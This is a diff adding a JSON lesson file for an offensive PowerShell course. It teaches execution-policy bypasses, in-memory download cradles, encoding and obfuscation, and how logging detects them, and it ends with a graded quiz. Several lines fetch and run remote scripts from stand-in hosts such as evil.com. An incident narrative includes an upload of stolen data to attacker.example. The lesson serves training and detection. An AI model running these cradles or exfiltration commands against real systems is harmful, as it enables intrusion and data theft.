@@ -1,0 +1,99 @@
+{
+  "lesson_id": "e5f6a7b8-c9d0-4e1f-2a3b-4c5d6e7f8a9b",
+  "domain": "red_team",
+  "title": "Building PowerShell Payloads",
+  "difficulty": 2,
+  "order_index": 38,
+  "prerequisites": ["USB and Media Drop Attacks"],
+  "concepts": ["PowerShell execution policy bypass techniques", "Payload encoding and obfuscation", "Download cradles and remote execution", "PowerShell logging and detection evasion", "Common offensive PowerShell frameworks"],
+  "estimated_time": 50,
+  "learning_objectives": [
+    "Construct PowerShell payloads using various execution techniques and bypass methods",
+    "Apply encoding and obfuscation techniques to evade basic detection mechanisms",
+    "Create download cradles for remote payload delivery from attacker-controlled infrastructure",
+    "Understand how PowerShell Script Block Logging and Transcription affect offensive operations",
+    "Evaluate the trade-offs between stealth and functionality when building PowerShell payloads"
+  ],
+  "post_assessment": [
+    {
+      "question": "Which flag bypasses the PowerShell execution policy for a single invocation?",
+      "options": ["-ExecutionPolicy RemoteSigned", "-ExecutionPolicy Bypass", "-NoProfile", "-WindowStyle Hidden"],
+      "correct_answer": "-ExecutionPolicy Bypass",
+      "explanation": "-ExecutionPolicy Bypass tells PowerShell to ignore the execution policy for this session. It's the most commonly used bypass because it requires no registry changes and works in a single command line. -ExecutionPolicy RemoteSigned still restricts unsigned remote scripts."
+    },
+    {
+      "question": "What does the following PowerShell download cradle accomplish: `IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')`?",
+      "options": [
+        "Downloads the file and saves it to disk",
+        "Downloads the script content and executes it in memory",
+        "Downloads and displays the script without executing",
+        "Creates a web server on the local machine"
+      ],
+      "correct_answer": "Downloads the script content and executes it in memory",
+      "explanation": "IEX (Invoke-Expression) takes the downloaded script content and executes it directly in memory. The file never touches disk, which is why this technique is called 'fileless' — it avoids traditional disk-based detection. New-Object Net.WebClient).DownloadString fetches the content as a string, and IEX runs it."
+    },
+    {
+      "question": "Which PowerShell logging feature captures the actual content of deobfuscated scripts at runtime?",
+      "options": ["PowerShell Transcription", "Script Block Logging (Event ID 4104)", "Module Logging (Event ID 4103)", "Windows PowerShell Operational Log"],
+      "correct_answer": "Script Block Logging (Event ID 4104)",
+      "explanation": "Script Block Logging (Event ID 4104) captures the deobfuscated content of script blocks as they execute. This means even if an attacker encodes or obfuscates their payload, the decoded content is logged. This is the most impactful defensive feature against PowerShell attacks, which is why advanced attackers target its configuration."
+    },
+    {
+      "question": "What is the primary advantage of using Base64-encoded commands (`-EncodedCommand`) in PowerShell?",
+      "options": [
+        "It encrypts the command so defenders cannot read it",
+        "It allows execution of complex multi-line scripts from a single command line while avoiding special character issues",
+        "It makes the command execute faster",
+        "It bypasses all PowerShell security features including AMSI"
+      ],
+      "correct_answer": "It allows execution of complex multi-line scripts from a single command line while avoiding special character issues",
+      "explanation": "Base64 encoding with -EncodedCommand primarily solves the practical problem of passing complex scripts with special characters (quotes, pipes, backticks) through command-line interfaces. It is NOT encryption — defenders can trivially decode it. It doesn't bypass AMSI or Script Block Logging. Its 'evasion' value is minimal against proper logging."
+    }
+  ],
+  "jim_kwik_principles": ["Visualization", "Association", "Emotion", "Storytelling", "Chunking", "Active Recall", "Spaced Repetition", "Mnemonics", "Teach Back", "Focus"],
+  "content_blocks": [
+    {
+      "type": "mindset_coach",
+      "title": "PowerShell: The Attacker's Swiss Army Knife",
+      "content": "Love it or hate it, PowerShell is the most abused legitimate tool on Windows systems. It's built into every Windows installation, it can access every .NET API, it runs in memory without touching disk, and most organizations have poor visibility into how it's used. This lesson isn't about becoming a script kiddie — it's about understanding the exact techniques attackers use so you can build better detections. Every payload you learn to create, you should also learn to detect. Think like an attacker, defend like a professional."
+    },
+    {
+      "type": "explanation",
+      "title": "PowerShell Execution and Bypass Techniques",
+      "content": "PowerShell's execution policy is NOT a security boundary — Microsoft explicitly states this. It's a convenience feature to prevent accidental script execution. Any attacker can bypass it with a single flag.\n\n**Common execution bypass methods:**\n\n1. **-ExecutionPolicy Bypass**: The most straightforward approach.\n   `powershell -ExecutionPolicy Bypass -File script.ps1`\n\n2. **-ExecutionPolicy Unrestricted**: Similar to Bypass, but shows warnings for remote scripts.\n   `powershell -ExecutionPolicy Unrestricted -Command ...`\n\n3. **Pipe to PowerShell STDIN**: Bypasses execution policy entirely.\n   `cat script.ps1 | powershell -`\n   `echo 'Get-Process' | powershell -`\n\n4. **Invoke-Bypass from memory**: No file policy to check.\n   `powershell -Command \"IEX (New-Object Net.WebClient).DownloadString('http://server/payload')\"`\n\n5. **Registry key modification**: Change execution policy in the registry.\n   `Set-ItemProperty -Path HKLM:\\Software\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell -Name ExecutionPolicy -Value Unrestricted`\n\n**Other useful flags:**\n- `-NoProfile` — Skip loading the user's profile (faster, avoids logging in profile scripts)\n- `-WindowStyle Hidden` — Hide the PowerShell window\n- `-NoLogo` — Suppress the copyright banner\n- `-NonInteractive` — Run without user interaction\n- `-Command` — Execute a command string directly\n- `-EncodedCommand` — Execute a Base64-encoded command\n\n**The typical offensive invocation pattern:**\n`powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ...`\n\nThis combination maximizes stealth by avoiding profile scripts, bypassing execution policy, and hiding the window. Understanding this pattern is essential for both red and blue team work."
+    },
+    {
+      "type": "explanation",
+      "title": "Teach Me Like I'm 10: PowerShell Payloads Like Secret Messages",
+      "content": "Imagine you want to send a secret message to your friend across the classroom, but the teacher checks all notes that go through the air. PowerShell payloads are like those secret messages — and the techniques in this lesson are like different ways to hide them.\n\n**Download cradles** are like asking your friend to look at a poster on the wall instead of handing them a note directly. Instead of carrying the note (file) with you, you tell PowerShell 'go read this website and do what it says.' The note never touches paper (disk) — it's only in your head (memory).\n\n**Encoding** is like writing your note in a secret code. You turn 'Get-Process' into 'R2V0LVByb2Nlc3M=' (Base64). But here's the thing — this code isn't hard to break! The teacher (defender) can decode it just as easily as you can. Encoding just makes it hard to read at a glance and helps with special characters.\n\n**Obfuscation** is like writing your note in tiny handwriting, using abbreviations, and mixing in random words. Instead of 'Get-Process,' you write something like '&(\"{2}{1}{0}\" -f'cess','ro','Get-Pro'). It still means the same thing, but it's much harder to read. Again, a determined teacher CAN figure it out — it just takes more work.\n\nThe key lesson: there's NO way to make a secret note that a determined teacher can't eventually read. Every technique has a detection method. The goal is to understand both sides — how to write the messages AND how to catch them."
+    },
+    {
+      "type": "code_exercise",
+      "title": "PowerShell Payload Construction Lab",
+      "content": "Practice building and analyzing PowerShell payloads. All examples use safe, educational commands:\n\n# 1. Basic execution policy bypass\npowershell -ExecutionPolicy Bypass -Command \"Get-Process | Select-Object -First 5\"\n\n# 2. Full stealth invocation (common offensive pattern)\npowershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Get-Process\"\n\n# 3. Simple download cradle (download and execute in memory)\n# Educational: Download and display a text file\nIEX (New-Object Net.WebClient).DownloadString('https://example.com/test.txt')\n\n# 4. Alternative download cradles\n# System.Net.WebClient\nIEX (New-Object Net.WebClient).DownloadString('http://server/payload')\n\n# Invoke-WebRequest (PowerShell 3.0+)\nIEX (Invoke-WebRequest -Uri 'http://server/payload' -UseBasicParsing).Content\n\n# .NET [Net.WebClient] (shorter, harder to log)\nIEX ([Net.WebClient]::new().DownloadString('http://server/payload'))\n\n# 5. Base64-encoded command\n# First, create the encoded command:\n$command = 'Get-Process | Select-Object Name, Id, CPU | Format-Table'\n$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)\n$encoded = [Convert]::ToBase64String($bytes)\npowershell -EncodedCommand $encoded\n\n# 6. Simple obfuscation techniques\n# Variable substitution\n$cmd = 'Get-Process'; & $cmd\n\n# String concatenation\n$cmd = 'Get' + '-Process'; & $cmd\n\n# Format operator\n$cmd = '{0}Process' -f 'Get-'; & $cmd\n\n# 7. AMSI bypass (educational — shows what attackers attempt)\n# This is detected by modern EDR. Shown for understanding only.\n# [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField...\n# DO NOT use in production environments\n\n# 8. Check what PowerShell logging is enabled\nGet-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' | Where-Object {$_.Id -eq 4104} | Select-Object -First 5",
+      "code": "# Basic bypass\npowershell -ExecutionPolicy Bypass -Command \"Get-Process | Select-Object -First 5\"\n\n# Download cradle pattern\nIEX (New-Object Net.WebClient).DownloadString('https://example.com/test.txt')\n\n# Base64 encoding\n$command = 'Get-Process | Select-Object Name, Id, CPU'\n$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)\n$encoded = [Convert]::ToBase64String($bytes)\npowershell -EncodedCommand $encoded\n\n# Check PowerShell logging\nGet-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' | Where-Object {$_.Id -eq 4104} | Select-Object -First 5",
+      "language": "powershell"
+    },
+    {
+      "type": "real_world",
+      "title": "Real-World: PowerShell in Incident Response",
+      "content": "During an investigation of a ransomware incident at a mid-size healthcare organization, the DFIR team discovered the following attack chain:\n\n**Initial Access:** A phishing email delivered an .lnk file that executed:\n`cmd.exe /c powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.45/stage1.ps1')\"`\n\n**Stage 1 (staging.ps1):** Downloaded and loaded PowerView for AD reconnaissance:\n`IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.45/PowerView.ps1')`\n`Get-DomainUser | Select-Object samaccountname,admincount | Export-Csv -Path C:\\temp\\users.csv`\n\n**Stage 2 (lateral movement):** Used encoded commands for WMI lateral movement:\n`powershell -EncodedCommand <base64_encoded_command_to_disable_AV_and_copy_tools>`\n\n**Stage 3 (exfiltration):** Used PowerShell to compress and exfiltrate data:\n`Compress-Archive -Path D:\\data\\* -DestinationPath C:\\temp\\data.zip`\n`$wc = New-Object Net.WebClient; $wc.UploadFile('https://attacker.example/upload', 'C:\\temp\\data.zip')`\n\n**Detection Opportunities the Team Missed:**\n- Event ID 4104 (Script Block Logging) captured the decoded content of each stage\n- Event ID 4103 (Module Logging) showed PowerView module imports\n- Command-line logging (Event ID 4688) showed the initial powershell.exe invocation with suspicious flags\n- Network connections to the external IP were logged in Event ID 5156\n\n**The Lesson:** Every PowerShell attack leaves traces. The organization had Script Block Logging enabled but wasn't monitoring Event ID 4104. The data was there — the visibility was not."
+    },
+    {
+      "type": "memory_aid",
+      "title": "PowerShell Payload Quick Reference: CRADLE Mnemonic",
+      "content": "**C**ommand — Direct command execution\n`powershell -Command \"Get-Process\"`\n\n**R**un from URL — Download cradle\n`IEX (New-Object Net.WebClient).DownloadString('http://server/payload')`\n\n**A**lternative cradles:\n`IEX (IWR -Uri 'http://server/payload' -UseBasicParsing).Content`\n`IEX ([Net.WebClient]::new().DownloadString('http://server/payload'))`\n\n**D**isguise — Encoding and obfuscation\n`powershell -EncodedCommand <base64>`\n`$cmd = 'Get' + '-Process'; & $cmd`\n\n**L**ogging bypass considerations:\n- Script Block Logging (4104) — Captures decoded content\n- Module Logging (4103) — Captures module imports\n- Transcription — Full session recording\n- AMSI — Runtime malware scanning\n\n**E**xecution policy bypasses:\n`-ExecutionPolicy Bypass`, `-ep Bypass`, pipe to STDIN, registry modification\n\n**Key Detection Events:**\n- 4688 — Process creation with command line\n- 4104 — Script block content (deobfuscated!)\n- 4103 — Module logging\n- 4105 — Script block start\n- 4106 — Script block invoke"
+    },
+    {
+      "type": "reflection",
+      "title": "Red vs Blue: Detection Challenge",
+      "content": "Consider these attack scenarios from both sides:\n\n**Scenario 1:** An attacker runs:\n`powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://x.x.x.x/payload.ps1')\"`\n\nWhat 4 detection points could catch this? Think about: command-line logging (4688), Script Block Logging (4104), network connection logs, and AMSI.\n\n**Scenario 2:** An attacker uses Base64 encoding:\n`powershell -EncodedCommand SQBFAFgA...`\n\nWhy does encoding NOT prevent detection? What sees through it?\n\n**Scenario 3:** You're a defender and you see Event ID 4104 with a script block containing `$cmd = '{0}{1}' -f 'I','EX'; & $cmd (New-Object Net.WebClient).DownloadString(...)`. What obfuscation technique is this, and what does the actual executed code look like?\n\nTake time to think through these before checking answers:\n1. 4688 (command line with suspicious flags), 4104 (script block logs the IEX content), AMSI (scans the downloaded payload), network logs (connection to external IP).\n2. Encoding only obfuscates the command-line representation. Script Block Logging and AMSI both see the decoded content. It's transport encoding, not encryption.\n3. String format obfuscation. The actual code reconstructs 'IEX' from '{0}{1}' and then executes the download cradle. Script Block Logging captures the reconstructed command."
+    },
+    {
+      "type": "mindset_coach",
+      "title": "Understanding Weapons to Build Shields",
+      "content": "PowerShell payloads are the workhorse of Windows-based attacks, and understanding their construction is fundamental to both red and blue team work. You now know how attackers build download cradles, encode commands, and attempt to evade logging. More importantly, you understand why each technique fails against proper monitoring: Script Block Logging sees through encoding, AMSI scans runtime code, and command-line logging captures invocation patterns. In the next lesson, you'll learn about custom payload development — building on these foundations to create more sophisticated (and more detectable) tools. Remember: the best red teamers are the ones who understand detection deeply, and the best defenders are the ones who understand offensive tradecraft."
+    }
+  ],
+  "tags": ["Course: SANS-SEC467", "Career Path: Red Teamer", "Career Path: Pentester"]
+}
